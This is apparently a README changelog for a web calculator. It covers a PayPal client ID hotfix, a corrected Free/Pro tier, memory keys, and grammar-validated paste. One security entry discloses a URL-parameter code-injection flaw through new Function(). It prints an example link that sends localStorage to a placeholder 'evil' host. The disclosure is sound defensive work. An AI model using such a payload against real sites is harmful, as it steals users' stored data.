...
🔴 **v3.8.1 P0 Hotfix** (2026-06-14): Reverted the 2026-06-03 wrong-direction PayPal Live Client ID change (`eIIo` → `eIlo`, which caused 11 days of production SDK `onerror` and blocked all overseas subscribers). Concurrently bumped SW `CACHE_NAME` v3.8.1 and `pro-config.js?v=3.3.2`. Chrome MCP end-to-end verified Subscribe Buttons iframe×2 render correctly. See [CHANGELOG](CHANGELOG.md#381---2026-06-14--hotfix-paypal-live-client-id-反轉修復).
...
🔧 **v3.10.3 fixes the tier of `#79 Universal Gravitation`** (2026-08-14): the formula was mistakenly gated as Pro, yet it has a published **free** deep-dive article on Bobo Labs — readers following that link hit a paywall. Restored to Free; the physics category is back to 13 Free / 8 Pro. See [CHANGELOG](CHANGELOG.md).
...
🔒 **v3.10.0 security fix (CRITICAL, pre-existing)** (2026-08-14): the `#calc=` URL parameter used to be written into the calculator **with no validation at all** and then evaluated through `new Function()` — a link like `#calc=1,(fetch('//evil/?d='+JSON.stringify(localStorage)))` executes as soon as the victim opens it and presses `=` once (JS's comma operator makes it part of the `return` expression rather than dead code after it). Reproduced locally. That path now shares the same grammar validation as paste and refuses anything that doesn't pass. Also fixed: the payment/license modal (`#pro-modal`) was outside the input guard, so typing and pasting leaked into the calculator behind it; and `factorial()` had no upper bound, letting a single line of input freeze the tab. See [CHANGELOG](CHANGELOG.md#3100---2026-08-14--feat-記憶鍵-mmmrmc--剪貼簿貼上含一個-critical-安全修復).

🧠 **v3.10.0 memory keys + clipboard paste** (2026-08-14): Two things a calculator is supposed to have and this one didn't — **memory keys M+ / M− / MR / MC** (the string `memory` had 0 hits in the whole file) and **Ctrl/Cmd+V paste** (there was only `writeText` — content could get out but never in). M+ evaluates the *current expression* before accumulating (with `12×7` on screen it stores `84`); memory persists in localStorage across tab restarts, and MC/MR are disabled while memory is empty. Paste is validated at the **grammar** level rather than the character level: `calculate()` ultimately evaluates via `new Function()`, and paste is the first path that lets an externally-sourced string reach it, so the whole string must be consumable by a tokenizer or the entire paste is rejected (which is what stops strings like `exp.call(1)` that merely start with a legal function name). Full-width characters, assorted dashes and thousands separators are normalized — but separators are only stripped when the string contains no function call, since `nCr(5,123)` looks exactly like one. See [CHANGELOG](CHANGELOG.md#3100---2026-08-14--feat-記憶鍵-mmmrmc--剪貼簿貼上含一個-critical-安全修復).
